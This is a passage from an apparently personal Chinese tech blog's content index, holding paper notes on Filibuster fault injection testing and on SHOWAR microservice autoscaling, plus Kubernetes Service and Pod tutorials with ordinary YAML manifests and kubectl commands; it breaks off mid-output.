Secondary：数据库次要副本 App Server：向 Requestmapper 服务发出请求以解析 URL，然后对数据库执行读后写请求，并在主数据库不可用的情况下回退到辅助数据库副本 Load Balancer：对请求进行负载均衡 同样的，在实际部署时做出一些调整：\nDB Primary 和 Secondary 服务是 MySQL 实例。为了模拟这一点创建一个 HTTP 服务，该服务要么在成功读取或写入时返回 200 OK，要么在数据库为只读时返回 403 Forbidden。 负载均衡器服务是一个 HAProxy 实例。为了模拟这一点创建一个 HTTP 代理做负载均衡。 故障信息有两个：\nMySQL instance is read-only：当 MySQL 实例为只读时，数据库会返回一个在代码的一个区域中未处理的错误。由于 Mailchimp 使用 PHP，这个错误会直接呈现到页面的输出中，我们通过将 403 Forbidden 响应转换为直接插入页面的输出来模拟这一点。 Requestmapper is unavailable：当 Requestmapper 服务不可用时，App Server 无法正确处理错误，向负载均衡器返回 500 Internal Server Error。但是，负载均衡器仅配置为通过返回格式化的错误页面来处理 503 Service Unavailable 错误。 Netflix 包含十个微服务。\nClient：模拟移动客户端 API Gateway：展示用户主页 User Profile：返回用户信息 Bookmarks：返回最后查看的位置 My List：返回用户的电影列表 User Recs.：返回用户推荐的电影 Ratings：返回用户的评分 Telemetry： 记录日志信息 Trending：返回电影观看趋势 Global Recs.：返回推荐电影 对于功能测试，我们有一个尝试为用户加载 Netflix 主页的功能测试。\n故障信息有三个：\nMisconfigured timeouts：User Profile服务以 10 秒的超时时间调用日志服务；但是，API Gateway会以 1 秒的超时时间调用用户配置文件服务。 Fallbacks to the same server：如果我My List服务不可用，系统将重试。 Critical services with no fallbacks：User Profile服务没配置回退。 实验评估 在具有 15 GB 内存和 8 个 vCPU 的 AWS CodeBuild 实例上运行了所有示例。在 Filibuster 运行开始时，启动了每个示例的所有服务，等待这些服务上线并在测试结束时终止它们，不会在测试执行之间重新启动服务。\nTests Generated and Increased Coverage Test Gen/DR Gen：表示 Filibuster 生成和执行的测试数量。由于每个示例只有一个功能测试，因此这些数字包括该测试的总数，因为 Filibuster 必须首先执行初始通过的功能测试，以确定在哪里注入故障。在语料库中包含错误的所有示例中，可以使用Filibuster 识别错误。\nCoverage After：表示报表覆盖率的增加。通过生成涵盖可能故障的测试，我们能够增加应用程序的覆盖率。这些数字仅用于功能测试。生成的测试增加了与未经修改的功能测试未执行的错误处理代码相关的覆盖率。\nTime w/DR：表示启用动态缩减的执行时间。\nTG Overhead：表示生成测试的总开销时间。\nDynamic Reduction 当应用程序以服务图的深度而不是广度的方式构建时，应用程序可以从动态缩减中显着受益，例如Audible就是服务调用关系具有一定的深度。\nMocks 实现语料库时，作者为每个示例中的每个服务编写了单元测试，使用模拟来解释可能的远程服务故障。 在编写这些测试时，只测试了独立的故障。\n如图 2 的 Audible 下载服务，其单元测试包含一个模拟三个依赖项的失败：Ownership、Active和State。在这里省略了服务特定故障的列表，请读者参考图表获取列表。\n同时为Timeout和ConnectionError这两个异常分别编写了一个模拟。\n不足和未来工作 语料库中的示例用HTTP 服务取代了真实云服务和数据库的使用，但在实际生产环境中，服务间的通信方式还包括如gRPC等多种服务通信。作者已经开始努力通过 gRPC 支持和对 AWS DynamoDB 和 AWS RDS 等云服务的支持来扩展系统原型。 该设计不考虑服务响应的损坏，而是关注假设的响应或指示失败的响应。 系统中将返回错误码就看作请求失败，但是在生产环境中，往往对一些错误响应会给出处理。在某些情况下，可能会提示开发人员编写异常处理程序和其他条件错误处理，以处理实际上可能不会在生产中发生的故障。 动态缩减在微服务依赖呈现更大的调用深度时表现更好，广度更大时难以起到明显的作用。 ","date":"2022-02-24T19:25:41+08:00","permalink":"https://lizonglingo.github.io/p/service-level-fault-injection-testing/","title":"Service-Level Fault Injection Testing"},{"content":" 来源：ACM SoCC'21\nhttps://acmsocc.org/2021/accepted-papers.html\n概述 解决了什么问题：提出一个微服务资源调度框架，解决微服务的调度问题，具体来说从水平扩缩容——增减服务实例和垂直扩缩容——控制每个服务CPU和内存等资源的配额两个维度对微服务进行调度\n适用于什么环境：该资源调度框架应用于使用K8s部署的微服务上\n实验的实施和结果：使用多个微服务应用和现实世界中的负载情况进行实验，资源利用表现提高22%，用户端到端实验降低20%\n目标和宗旨：找到一个最佳资源分配大小，保持良好服务质量的同时尽可能提高资源利用率，减少资源配额\n微服务调度存在的问题和挑战 确定微服务应用对资源的需求是个复杂工作，难以预先确定 如果分配过多的资源会造成集群资源利用率低，增加开销 分配资源过少则导致服务性能下降甚至服务不可用，带来更严重的问题 贡献 垂直和水平扩缩容框架，旨在提高资源分配的效率 调度亲和性和反亲和性规则，为K8s调度程序生成更好的微服务调度规则，提高调度效率 实现上述要点并评估 设计思路 概述 垂直扩缩容：参照历史资源利用率来寻找每个微服务的最佳资源配额，调度的资源是每个服务占用的CPU、RAM、Disk等资源 水平扩缩容：使用Linux内核线程调度程序队列的指标（如eBPF runq latency）为扩缩容指标，同时利用控制理论的思想，在微服务运行时对实例数量进行控制。并设计了一个proportional-integral-derivative控制器，利用历史扩缩容操作和当前的运行时状态来做出下一个水平扩缩容决策，并保持服务的稳定，调度的资源是增减服务实例数量 服务间依赖：同时考虑了服务间依赖关系，优先调度应用中负载压力大的微服务（如某个微服务作为其他微服务的引用） 服务性能：在找到一个最佳配额后，会协助集群调度微服务以获得更好的端到端性能 K8s亲和性与反亲和性：通过不同微服务的历史资源使用情况为K8s生成调度规则（如某种微服务和某类资源有正相关性或负相关性） 调度效率：能够快速适应工作负载变化 垂直扩缩容 调度依据指标：实例的历史资源使用情况（CPU、RAM、Disk、Network等）\n需要达成的效果有：\n在运行时为服务找到合适的资源需求 最大限度减少过度配置导致的资源使用松弛（松弛度=资源配额-资源使用量） 最大限度减少OOM错误和CPU负载过高的情况，保证服务质量 垂直扩缩容的局限：每个实例的资源占有量最大不会超过虚拟机的资源量，所以某些情况下即使将虚拟机的所有资源都给到实例也难以满足要求，这就需要水平扩缩容\n水平扩缩容 调度依赖指标：eBPF指标数据 eBPF：允许在内核级别允许安全和低开销的程序，从内核级别收集准确的事件信息，如CPU调度程序决策事件、内存分配事件和网络堆栈中的数据包事件。已经被广泛用于微服务检测、性能提升、链路追踪、负载均衡、网络监控和安全中。\n具体思路 垂直自动扩缩容 K8s（Google Autopilot也是类似）通过检测一段时间窗口（几分钟到几天）中的CPU和内存使用量来设置下一个事件窗口中的资源。通过一个margin和观测到的如P95、P99的百分位值，目的是为资源增加一些宽裕度，尽可能减少OOM错误和CPU不够用的情况发生。作者认为这还不够节约，存在资源浪费的情况发生。$\\alpha$为宽限额度，$\\pi$是某个测量的百分位数值。\n而SHOWAR使用“three-sigma”经验法则去分配资源。\nSHOWAR收集持续时间W秒的最后一个窗口的每种资源使用的统计数据，每秒收集一次，用于递归计算该窗口上的资源使用平均值$\\mu$和方差$\\sigma^2$。 计算$s=\\mu + 3\\sigma$，这里$s$就是特定资源的一个估计量 然后每经过T秒（T \u0026laquo; W）评估资源使用量是否发生了很大的变化（如超过15%），一旦超过预期值就实施资源重新分配。 作者认为使用百分数值的3-σ法则能在保证服务良好运行的情况下最大限度的减少资源浪费，同时使用一个阈值来决定是否进行资源重新分配操作能在资源使用差异较小时不会过度配置资源。虽然$\\mu+3\\sigma$和$\\pi(1+\\alpha)$都有明确的统计解释，但是使用$3\\sigma$可以更加准确的看到均值的分布。如果方差非常小，则分布几乎是恒定的，这是关于 Pod 资源使用情况的单独有用信息。然而，在$\\pi(1+\\alpha)$方法中，当方差非常小时，尾部百分位数不能传达有用的信息。此外，安全宽裕度参数 $\\alpha$的选择可能是任意的，如果未正确指定，可能会导致资源利用率低下或更多OOM错误。\n关于P90、P95等百分位数值的补充资料：https://www.cnblogs.com/hunternet/p/14354983.html\n水平自动扩缩容 水平自动扩缩容目前存在一些缺陷：\n由于水平扩缩容的主要形式是通过增减服务实例数量来调整资源分配，服务实例在遇到负载激变发生资源使用抖动时，可能导致极端过度配置或者配置严重不足。为了解决这种情况，有些自动缩放策略引入冷却期的概念，在最后一次操作之后的一段时间内不进行扩缩容。如果出现瞬时负载峰值过高的情况也会因为处于冷却期而避免不必要的扩容操作。 系统不会将系统微服务的依赖关系考虑在内，而是单独处理某个微服务。实践表明在不考虑微服务相关性的前提下的资源分配和缩放效率低下，并且不一定有助于应对负载变化和保证服务质量。如下图对某个后端服务在5s时注入高负载，然后经过一段时间，后端的高延迟情况传到了前端，如果考虑微服务间依赖关系，那么仅扩容后端微服务就可以解决这个问题。 以往通常使用CPU利用率作为缩放指标，力求在所有微服务中保持目标 CPU 利用率。但CPU 利用率并不是自动缩放和资源分配的最有效指标，随着负载的增加，几乎所有微服务的 CPU 利用率都会增加，而上图的前端微服务的尾部延迟并不总是随着 CPU 利用率的增加而增加（主要是由于后端微服务的高延迟导致的）。 SHOWAR旨在解决上述问题，使用控制理论基本框架来设计有状态的水平缩放系统，在满足SLO指标下保证服务稳定。\n通过观测值与目标值的差别来控制缩放是不准确的：$e=observation-target$​​，为此作者设计了更复杂的控制器pro-portional–integral–derivative (PID) controller：\n对资源的检测使用我们使用eBPF Linux调度程序runq 延迟度量，它表示线程可运行与获取CPU并运行之间的时间。使用Runq延迟的P95作为目标点。与CPU利用率不同，高runq延迟与每个单独的微服务的高请求尾延迟高度相关，这表明runq延迟可以用作水平自动缩放的合适指标，以防止请求延迟增加。直观地说，runq延迟优于CPU利用率的原因是它表明应用程序线程如何竞争CPU资源，因此需要更多（或更少）的CPU资源。在SHOWAR中，使用者要指定目标runq的延迟值作为配置的一部分。\n水平扩缩容的传递函数很简单，如果runq超出目标值，则系统必须向外扩展并增加副本数量，反正小于目标值则缩减服务实例（这里目标是是一个范围？我是这么认为的）。为了防止执行过多的自动缩放操作以响应 runq 延迟指标中的快速变化和瞬时突发性，作者在目标周围设置了一个可配置的界限$\\alpha%$​​（默认为 20%）作为缓冲区并且不执行自动缩放操作。自动缩放的增加或减少量是微服务当前副本数量的可配置 𝛽 百分比（默认为 10%），如果实际缩放副本数小于1则默认是1（我的理解是，如该实例有20个副本，则扩容20×0.1=2个副本，如果是4个副本4×0.1=0.4\u0026lt;1即扩容1个副本）。算法如下：\n水平自动扩缩容的两种架构：\nOne For All：单个控制器负责自动扩展所有微服务类型。在每个自动缩放决策中，所有微服务都会根据所有微服务中当前度量值观察的平均值一次缩放。虽然这种方法受益于 PID 控制器，但它没有考虑微服务的微服务依赖关系图。 One For Each：控制器负责每个微服务。每个控制器监控其相应微服务的自动缩放指标runq，根据上述算法进行缩放。控制器输出的绝对值被排序，具有最高值（最大扩展需求）的那些被优先考虑。对于相等的控制器输出，我们会考虑微服务的依赖关系图，并将后端服务优先于依赖的前端服务（在图的拓扑排序之后）。 将二者串联 在K8s等部署平台上推荐的方法是：一次部署仅使用一类缩放器（如为每个微服务确定固定的实例数量的前提下，部署垂直缩放器，自动调整每个实例的资源分配量；或是确定好资源分配量后，令服务通过水平缩放器自动进行实例数量的增减）。\nSHOWAR通过允许串联部署这二者。首先，作者将任何垂直自动缩放决策优先于任何水平自动缩放决策。因为，例如在内存自动缩放的情况下，如果 Pod 的内存不足，应用程序会遇到OOM错误并停止执行，而不管其副本数如何，所以水平自动缩放器无法解决OOM问题。因此，在水平自动缩放控制器动作之前，它首先检查共享通道以查看该微服务是否正在进行垂直自动缩放，如果是则不会继续操作。类似地，在垂直Pod自动缩放器动作之前，它会通过共享通道发送消息通知水平自动缩放器，然后执行其操作。\n此外，由于谷歌云平台的 Kubernetes 最佳实践，建议大多数 Pod 不需要超过一个核心，作者根据这个建议将其合并到 SHOWAR 的垂直自动缩放器设计中：如果垂直自动缩放器决定为 Pod 设置多个核心，它会改为通过共享通道向水平自动缩放器发出信号，并且不会继续执行垂直自动缩放操作。即：核心数增加转化为实例数量增加。\n利用K8s亲和性和反亲和性获取更好的调度性能 关于K8s的亲和性和反亲和性可以概括为：服务𝑆2与服务𝑆1的亲和性意味着调度程序将始终（或最好）尝试将服务 𝑆1 的 Pod 调度到服务 𝑆2 所在的节点上。类似地，服务𝑆2与服务𝑆1的反亲和性意味着调度程序永远不会（或最好不）这样做。\nSHOWAR监控和使用微服务的历史（即最后（可配置）时间窗口）CPU、内存和网络使用情况，并计算每对微服务使用模式之间的Paerson相关系数来计算相关性：给定两种微服务类型𝑋和𝑌的CPU（或内存或网络I/O）使用分布，𝑋和𝑌之间的相关系数$\\rho$​为：\n对于两个微服务𝑆1和𝑆2，资源使用模式（例如CPU或内存）的正相关性越高，它们之间对该资源的资源争用就越高。同样，负相关越低，两个服务之间对该资源的争用就越低。这是 SHOWAR 对 CPU、内存和网络 I/O 等计算资源的亲和性和反亲和性规则的简单基础。\n进一步产生亲和性和反亲和性规则，规则生成机制如下：\nCPU和NetWork：如果两个服务s1、s2的CPU和网络是用呈现强负相关（$\\rho_{s1s2}\\leq-0.8$​​​​​）,则为其生成亲和性规则。 Memeory：如果任何一对微服务s1和s2在它们的内存使用模式中具有强正相关（例如$\\rho_{s1s2}\\geq-0.8$​），则SHOWAR 为调度程序生成s1和s2的反亲和性规则。(实际上也是负相关$\\Longrightarrow$亲和性)。 此外，为避免调度冲突，每个微服务在任意时间最多参与一个亲和性或反亲和性规则。 实现 系统架构 Monitoring Agents 使用Prometheus从节点和容器收集不同的指标。通过集群中的每个节点上启动一个监控代理来收集容器指标，例如CPU使用率、内存使用率、网络带宽使用率等。代理被配置为每秒收集和报告一次指标。Prometheus附带一个时间序列数据库，代理存储收集到的指标。此外，还提供了一种查询语言来查询其他模块使用的时间序列数据库以利用收集的指标。\n此外作者还开发了一个eBPF程序作为监控代理部署在集群中的每个节点上，以收集水平自动缩放器使用的 runq latency指标。该指标是每个Pod的CPU线程在获取CPU之前所经历的延迟的直方图。程序每 1 秒收集一次runq latency直方图，并将其存储在Prometheus时间序列数据库中。\nThe Vertical Autoscaler 垂直自动缩放器是一个简单的循环，每分钟发生一次。 它会在前5分钟的窗口中为每种资源类型r（CPU和内存）评估$s_r = \\mu_r + 3*\\sigma_r$，如果s的值变化超过 15%，它会更新服务的资源需求s。 触发垂直自动缩放器的另一个条件是微服务报告 OOM 错误。 在应用微服务的新资源需求之前，垂直自动缩放器通过共享通道向水平自动缩放器发送一条消息，以不继续任何水平自动缩放操作，因为垂直自动缩放操作优先于水平自动缩放。 如果微服务的CPU数量超过一个CPU核心，垂直自动缩放器也不会继续执行微服务的自动缩放操作，在这种情况下，它会通过另一个共享通道向水平自动缩放器以触发水平自动缩放操作。 The Horizontal Autoscaler 对于给定的目标runq latency，它对该微服务执行水平自动缩放操作，使其始终具有目标值的runq latency。控制器每1分钟决定eBPF程序收集60个度量直方图实例（每秒1个）。对于每个直方图，选择第 95个百分位数，控制器使用这60个数据点的平均值作为其当前观察值（也称为测量值）来执行其控制动作。每个水平扩展操作添加或删除至少1个或可配置百分比（默认为 10%）的微服务当前副本数，分别用于扩缩容。\nPID控制参数的初始值取为$k_P=k_I=k_D=1/3$​​（每个参数限制为∈[0,10]，这几个参数会影响控制器的速度、稳定性和准确性）。这些参数的增量变化是 10%（我们通过实验发现 10% 可以提供非常好的性能）。控制器输出的波动是进行此类更改的基础，使用之前的N =10个样本进行测量。此外，控制器的“速度”被测量为达到区间[target(1 − 𝛼), target(1 + 𝛼)] 所需的迭代次数，因为 𝛼 =10%。\n增加$k_P$​会导致控制器速度执行增加（以达到稳定状态），同时过高的值可能引发不稳定性。 增加$k_I$​也会增加控制器的速度并可能导致不稳定，但增加它会降低控制器的噪声（变化和波动）和稳态误差。 增加$k_D$​会增加控制器的速度（达到稳态）以及不稳定的可能性，同时会显著放大控制器的噪声。 控制器从系数的相等值开始。 随后这些系数基于监控的工作负载性能和控制器状态进行自适应和增量自调整。 如果当前指标值（尤其是runq延迟）远离目标指标值，则在每次迭代中增加$k_P$和$k_I$，以提高稳定性以及达到目标指标值的速度。 此外，如果观察到度量值的波动（在控制器中称为噪声），$k_D$​会逐渐减小以减少工作负载突发性引入的噪声。 The Affinity Rule Generator 亲和性规则生成器每5分钟使用一次CPU、内存和网络利用率，这是一个由300个数据点组成的向量（每个数据点是微服务副本的平均值）来计算每个资源类型之间的相关系数一对微服务。为消除弱相关或无相关实例，[−0.8,+0.8]中的任何值都会被丢弃。其他强负相关和强正相关的微服务用于生成亲和性和反亲和性规则。资源使用模式会随着工作负载的变化（也称为工作负载转移）而变化，因此如果在随后的5分钟时间窗口内强烈的负相关或正相关变化超过20%（可配置），SHOWAR会撤销亲和性（或那对微服务的反亲和性）规则。\n其他要点 SHOWAR是作为Kubernetes控制器构建的，对于自动扩缩器和其他类型的控制器具有高度可插入性。此外，SHOWAR使用常用的Kubernetes监控代理（例如Prometheus）和一个自定义的eBPF指标监控代理。因此，与默认的Kubernetes自动缩放器相比，SHOWAR不会引入任何额外的开销。此外，自动缩放器被调度在控制器节点上，并且不与调度在工作节点上的应用程序 Pod 共享资源。\n实验 在AWS部署K8s集群，用Google Autopilot和K8s默认的调度程序作比较。资源利用率提升22%，延迟降低20%。\n实验设置 Applications 社交网络应用：包含36个微服务，可以关注他人、撰写帖子、阅读他人帖子并与之互动。 火车票应用：包含41个微服务的应用程序，允许其用户在线预订门票并进行支付。 谷歌云平台的线上精品店：由 10 个微服务组成，用户可以通过他们的在线购物车购买在线商品并进行支付。 实验将runq延迟的目标值设置为15𝑚𝑠，即 Linux 内核 sysctl_sched_latency[31] 调度程序参数的 2.5𝑥。\nCluster Setup 在AWS上进行的。 使用 𝑚5.𝑥𝑙𝑎𝑟𝑔𝑒 VM 实例，每个实例具有 4 个 vCPU、16 GB 内存和 0.192 美元/ℎ𝑟 价格。 运行Ubuntu 18.04 LTS，配置为支持运行eBPF程序。 除非另有说明，否则集群都是由25个VM实例组成。 Workload and Load Generation 我们使用Wikipedia访问跟踪[59]作为我们的主要工作负载。它是用户与Wikipedia网站交互的真实世界轨迹，由流量模式组成，包括泊松到达时间、短期突发性和昼夜水平变化。由于我们正在评估的微服务是面向用户的应用程序，因此工作负载必须反映真实的用户行为。因此，维基百科访问跟踪非常适合我们的评估。我们以分布式方式使用locust [26]作为我们的工作负载生成器。 Locust客户端驻留在与托管应用程序的主集群不同的VM实例上。\nBaselines Kubernetes默认自动缩放器和 Google Autopilot。\nVertical Autoscaling 首先评估 SHOWAR 的垂直自动缩放器（禁用水平自动缩放器）在减少相对内存松弛方面的有效性。\n使用来下图中所示的 Wikipedia 访问跟踪的一小时长的工作负载进行评估。\n每5分钟记录一次垂直自动缩放器为每个微服务设置的内存限制以及微服务的实际使用情况，以计算其内存使用松弛（即松弛 = 限制 - 使用）。\n下图描绘了社交应用所有微服务相对内存使用松弛的累积分布函数（the cumulative distribution function，CDF）。\n可以看出，通过历史资源使用的变化（使用3-σ规则），SHOWAR 的垂直自动缩放器与Autopilot 和 Kubernetes 的垂直自动缩放器相比能够改善内存使用松弛度。特别是，对于95%的服务实例，相对内存使用松弛率小于46%，而 Kubernetes 和 Autopilot 分别为 63% 和 66%。这 20% 的内存使用松弛可用于调度更多的服务实例或在集群中使用更少的 VM 资源，这将明显降低成本（见 5.5 小节）。我们还观察到 Kubernetes 的性能优于 Autopilot，因为它在设置限制方面采用了更激进的方法（使用 P95 × 1.15 的过去使用量与最大值相比）。\n虽然低内存或 CPU 使用松弛可以导致高效且具有成本效益的资源分配，但它可能导致更高的 OOM 率或 CPU 节流，从而降低服务性能。下图显示了实验过程中 OOM 的数量。可以看出，虽然与 Kubernetes 相比，SHOWAR 的 OOM 数量相当，但与 Autopilot 相比，它们在内存扩展方面的激进方法导致了更多的 OOM。\n下图则描绘了在实验过程中微服务的平均 CPU 节流（CPU 紧松弛的结果）。当 Pod 的 CPU 使用率超过其分配的 CPU 资源时，容器运行时（使用𝑐𝑔𝑟𝑜𝑢𝑝𝑠）会限制 Pod 的 CPU 份额。可以看出，由于微服务 CPU 使用率的高波动（方差），SHOWAR 的 CPU 节流与基线相当。\n根据以上三图的分析，资源松弛度（也反映了资源使用效率）和系统稳定性之间存在权衡。SHOWAR和K8s在带来更好的资源效率的同时回不可避免的导致更多的OOM错误和CPU性能限制。而 Autopilot 会导致更多的松弛和更少的 OOM。\n因此，根据任务目标可调整 SHOWAR 和 Kubernetes 以实现更高的稳定性，但代价是更高的资源使用松弛度。例如，在 SHOWAR 中，可以使用 𝑘𝜎 代替 3𝜎 ，其中 𝑘 \u0026gt;3 为单个 Pod 分配更多资源并减轻 OOM 和 CPU 节流。\nHorizontal Autoscaling 使用垂直扩缩容相同的工作负载来评估水平扩缩容。将 SHOWAR 的 One for Each 和 One for All 设计与 Autopilot 和 Kubernetes 水平自动缩放器进行比较。Autopilot 和 Kubernetes 在水平自动缩放中使用相同的方法。我们将 Autopilot 和 Kubernetes 的目标 CPU 利用率设置为 65%，这是通常的建议。\n下图描绘了在实验过程中社交网络应用程序中微服务副本数量的累积分布函数。我们观察到 SHOWAR 的水平自动缩放器都优于 Autopilot 和 Kubernetes 水平自动缩放器，因为它为大多数微服务分配了更少的副本，这反过来又可以更有效地分配资源并节省成本（见 5.5 小节）。通过为每个微服务定制一个控制器，SHOWAR 的 One for Each 设计也优于 One for All。这是因为在 One for All 设计中，单个控制器尝试使用单个目标 runq 延迟值和跨所有微服务的平均 runq 延迟测量来扩展微服务，这会导致不必要的微服务扩展和高 runq 延迟。\n再次强调，SHOWAR 的有效性是由于：\n自动缩放器的状态控制器 用于自动缩放决策的更好的代表性指标（即 runq 延迟而不是 CPU 利用率） 我们看到了在单个微服务的自动扩展决策中使用更有意义和代表性的指标的效果。特别是，在评估过程中，我们观察到 Kubernetes 和 Autopilot 通常为 nginx 设置 16 个副本，这主要是因为它的 CPU 利用率很高。但高 CPU 利用率并不总是对应于微服务性能的大幅提升。相比之下，SHOWAR 只为这个微服务设置了 10 个副本。另一方面，对于其他几个微服务所依赖的 User 微服务，Kubernetes 和 Autopilot 通常只为其设置 3 个副本。相比之下，SHOWAR 通常为此微服务设置 6 个副本。\nThe Effect of Affinity and Anti-Affinity Rules 实验使用不同微服务之间 CPU、内存和网络 I/O 使用率的相关性来评估 SHOWAR 生成的 Pod 亲和性和反亲和性规则的效果。仍使用相同的工作负载并禁用垂直和水平扩缩容控制器，以凸显亲和性和反亲和性生成器的工作效果，以此观察K8s调度器受其的影响。\n同时观测了这如何影响端到端请求延迟，如下图所示。通过为调度程序提供调度提示（使用亲和性和反亲和性），SHOWAR 能够改善用户体验的 P99 延迟。特别是，使用 SHOWAR 生成的亲和和反亲和规则，请求延迟的 P99 为 6600 毫秒，而使用 Kubernetes 默认调度决策为 9000 毫秒。\nEnd-to-End performance 在端到端性能评估这部分使用三个组件协同工作，使用下图的工作负载进行测试。为了适应工作负载，我们将集群的大小增加到 30 个 VM 实例。结果表明，与基线相比，SHOWAR 改进了资源分配和利用率，同时保持性能的稳定。\n下图描述了用户在实验的 24 小时内经历的端到端请求延迟的 CDF。可以看出，使用 SHOWAR 的端到端性能与基线相当，并且使用其亲和性和反亲和性规则生成器以及依赖关系感知的水平自动缩放，与 Autopilot 和 Kubernetes 相比SHOWAR 能够将 P99 延迟提高 20% 以上。 Autopilot 和 Kubernetes 在 P99th 延迟方面表现出相似的性能，但是，由于为副本分配了更多内存，Autopilot 通常在较低的尾部优于 Kubernetes。\n下图显示了实验过程中集群中的总内存分配（即为微服务副本设置的内存限制总和）。与基线相比，SHOWAR 平均为微服务副本分配的内存更少。特别是，SHOWAR 平均分配了 205 GB，而 Autopilot 和 Kubernetes 分别分配了 264 GB 和 249 GB。主要是因为 SHOWAR 的垂直自动缩放器实现了较低的内存使用松弛度，并且其水平自动缩放器为微服务设置了较少的副本数量。因此，使用 SHOWAR 的总内存分配小于基线。\n最后，在下图中，展示了每个实验的归一化集群成本。我们将平均内存分配标准化为集群中一台虚拟机的内存大小（即 16 GB 用于𝑚5.𝑥𝑙𝑎𝑟𝑔𝑒 实例），并将其乘以 24 小时内一台虚拟机的成本（即 $0.192/ℎ𝑜𝑢𝑟）。这是因为，通常虚拟机在公共云上的价格是内存大小的线性函数 [17]。可以看出，与 Autopilot 和 Kubernetes 相比，SHOWAR 将集群总成本效益分别提高了 22% 和 17%。这些改进来自这样一个事实，即与基线相比，SHOWAR 的垂直和水平自动缩放器用分配更少的计算资源就可以达到相同的性能和服务质量。\n不足和未来工作 SHOWAR是基于历史和现在进行反应式调度的，缺乏预测能力\n我们将 SHOWAR 设计为计算量轻且适应性强，这与使用需要训练且无法应对工作负载转移的机器学习的“黑盒”方法形成对比，例如 [39,55,57]。然而，目前 SHOWAR 的一个主要限制是它对微服务的资源使用是反应性的。因此，一个合适的探索途径是为 SHOWAR 配备近期工作负载和资源使用预测，例如 [18]。结合其当前设计，预测近期工作负载可以改善 SHOWAR 的资源分配并防止由于自动缩放操作不足而导致性能下降。\n另一个限制是它只关注微服务自动扩展并假设一个固定大小的集群\n解决应用程序自动缩放器请求的资源总量超过可用集群资源总量的场景非常重要。虽然集群自动缩放与应用程序自动缩放是正交的，但它们需要协同工作以实现资源分配的整体效率和应用程序的性能要求。因此，需要两个自动扩缩器之间的通信和协调才能向集群添加更多资源。在未来的工作中，我们计划改进 SHOWAR 的自动缩放器以与现有的集群自动缩放器 [12] 一起使用。\n还不适用于Serverless类型的工作负载\n原因之一是垂直自动缩放不适用，因为无服务器功能的容器大小是预定义的。 SHOWAR 的水平自动缩放器可能面临额外的复杂性，例如，跟踪“休眠”无服务器函数的数量（可以热启动）以及每个函数“过期”的时间（因此需要冷启动延迟）。我们将探索无服务器功能水平扩展的控制理论方法留给未来的工作。\n计划改进 SHOWAR 的亲和性和反亲和性规则生成器\n目前使用简单的经验资源利用相关系数来确定微服务之间的成对亲和力。例如，我们可以在未来探索其他统计数据对亲和力的影响，例如不同类型资源之间的互相关，并探索不同类型的调度机制，这些调度机制可以直接利用这些“原始”统计信息来提高效率资源利用[19]。\n","date":"2022-02-22T13:45:25+08:00","permalink":"https://lizonglingo.github.io/p/showar-right-sizing-and-efficient-scheduling-of-microservices/","title":"SHOWAR: Right-Sizing And Efficient Scheduling of Microservices"},{"content":"为什么需要使用Kubernetes Service 如前文提到，集群中Pod的IP地址是不稳定的， 会随着Pod的删除、重启、扩缩容等活动发生变动。这就出现了一个问题：无法通过一个固定的地址来访问应用程序。\nKubernetes Service则专门来解决这个问题。\nKubernetes Service K8s Service有一个固定的IP地址、固定的DNS名称以及固定的端口。通过标签选择器在后端连接所有符合要求的Pod，前端则提供了一个固定的访问平面来接收所有访问Pod的请求，再将这些请求负载均衡到后端的Pod中。可以将Service理解为Pod的网关，一个前端固定而后端随着Pod变化而变化的K8s中间件。\n使用Label达到Service与Pod间的松耦合 Service通过标签选择器来选择Pod。如下面的deploy.yml和svc.yml文件。\napiVersion: apps/v1 kind: Deployment metadata: name: web-deploy spec: replicas: 10 selector: matchLabels: app: hello-world template: metadata: labels: app: hello-world\t# 在Deployment的模板中，定义了Pod所属的标签，即 app=hello-world spec: containers: - name: hello-ctr image: nigelpoulton/k8sbook:latest ports: - containerPort: 8080 通过上面的Deployment部署文件部署的Pod都具有app=hello-world这一标签。\napiVersion: v1 kind: Service metadata: name: hello-svc spec: type: NodePort ports: - port: 8081 nodePort: 30001 targetPort: 8080 protocol: TCP selector: app: hello-world\t# 选择器selector选择的Pod应具有的标签 上面的Service部署文件则通过选择器选定含有标签为app=hello-world的Pod，为这些Pod做匹配关联。Pod必须含有Service所指定的全部标签，除此之外还有其他多余的标签也是可以的。\nService与Endpoint 每一个Service在创建时会关联到一个Endpoint对象，该Endpoint对象中维护所有满足Service标签选择器的Pod的列表。\nKubernetes会不断检查Service的Label选择器和当前集群中的健康Pod列表，如果有新的可以匹配该Label选择器的Pod，就将其加入Endpoint中，然后Service从这个Endpoint中选择流量转发的Pod。\nService相关的端口 上述Service部署文件中，出现了这样几个端口：\nports: - port: 8081 nodePort: 30001 targetPort: 8080 protocol: TCP port：Service监听的端口，集群中通过Service IP访问Pod应用的流量首先需要访问Service IP+port\nnodePort：为集群外流量开放的端口，可以使用集群中任何一台部署Pod的主机的IP+nodePort访问应用\ntargetPort：Pod所监听的端口，告诉Service将流量转发到Pod的该端口\n","date":"2022-01-25T20:06:01+08:00","permalink":"https://lizonglingo.github.io/p/kubernetes-service%E7%9A%84%E4%BD%BF%E7%94%A8k8s%E5%AE%9E%E8%B7%B5-4/","title":"Kubernetes Service的使用(k8s实践-4)"},{"content":"使用Pod Pod.yaml\napiVersion: v1 kind: Pod metadata: name: hello-pod labels: zone: prod version: v1 spec: containers: - name: hello-ctr image: nigelpoulton/k8sbook:latest ports: - containerPort: 8080 创建Pod\nroot@lzl:/home/lzl# kubectl apply -f ./WorkSpace/k8s/pod/Pod.yml pod/hello-pod created root@lzl:/home/lzl# kubectl get Pods NAME READY STATUS RESTARTS AGE hello-pod 0/1 ContainerCreating 0 12s # 要等一会，因为有拉取镜像的时间 root@lzl:/home/lzl# kubectl get Pods NAME READY STATUS RESTARTS AGE hello-pod 1/1 Running 0 110s 获取Pod信息 获取Pod详细信息：\nkubectl get Pods hello-pod -o yaml root@lzl:/home/lzl# kubectl get Pods hello-pod -o yaml apiVersion: v1 kind: Pod metadata: annotations: kubectl.kubernetes.io/last-applied-configuration: | 